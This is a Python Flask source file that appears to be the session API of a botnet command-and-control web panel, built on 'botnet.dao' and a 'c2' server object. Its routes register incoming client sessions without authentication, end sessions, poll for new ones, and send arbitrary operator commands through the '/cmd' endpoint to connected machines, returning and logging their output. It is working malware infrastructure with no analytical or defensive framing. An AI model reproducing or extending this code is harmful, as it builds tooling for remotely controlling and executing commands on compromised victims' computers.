import json
from flask import Blueprint, request, redirect, url_for, flash, jsonify
from flask_login import login_user, logout_user, current_user, login_required
from web_gui.main import c2
from botnet.dao import session_dao, task_dao
from botnet.models import db, Session

# Blueprint
session = Blueprint('session', __name__, url_prefix='/api/session')

@session.route("/new", methods=["POST"])
def session_new():
	"""Add session metadata to database."""
	if not request.json:
		return redirect(url_for('root.sessions'))
	data = dict(request.json)
	session_metadata = session_dao.handle_session(data)
	return jsonify(session_metadata)

@session.route("/remove", methods=["POST"])
@login_required
def session_remove():
	"""End an active session."""
	session_uid = request.form.get('session_uid')

	if not session_uid:
		flash('Invalid session UID', 'danger')
		return redirect(url_for('root.sessions'))

	# kill connection to C2
	owner_sessions = c2.sessions.get(current_user.username, {})

	if session_uid and session_uid in owner_sessions:
		session_thread = owner_sessions[session_uid]
		try:
			session_thread.kill()
		except Exception as e:
			return "Error ending session - please try again."

	# remove session from database
	s = session_dao.delete_session(session_uid)
	return "Session {} removed.".format(session_uid)

@session.route("/cmd", methods=["POST"])
@login_required
def session_cmd():
	"""Send commands to clients and return the response."""
	session_uid = request.form.get('session_uid')

	command = request.form.get('cmd')

	# get user sessions
	owner_sessions = c2.sessions.get(current_user.username, {})

	if session_uid in owner_sessions:
		try:
			session_thread = owner_sessions[session_uid]

			# store issued task in database
			task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid'), 'issued_by': current_user.username})

			# send task and get response
			session_thread.send_task(task)
			response = session_thread.recv_task_result()

			# update task record with result in database
			result = task_dao.handle_task(response)
			return str(result['result'])
		except Exception as e:
			session_dao.update_session_status(session_uid, False)
			_ = owner_sessions.pop(session_uid, None)
			return "offline"
	else:
		session_dao.update_session_status(session_uid, False)
		return "offline"

@session.route("/poll", methods=["GET"])
@login_required
def session_poll():
	"""Return list of sessions (JSON)."""
	new_sessions = []
	for s in session_dao.get_user_sessions_new(current_user.id):
		new_sessions.append(s.serialize())
		s.new = False
		db.session.commit()
	return jsonify(new_sessions)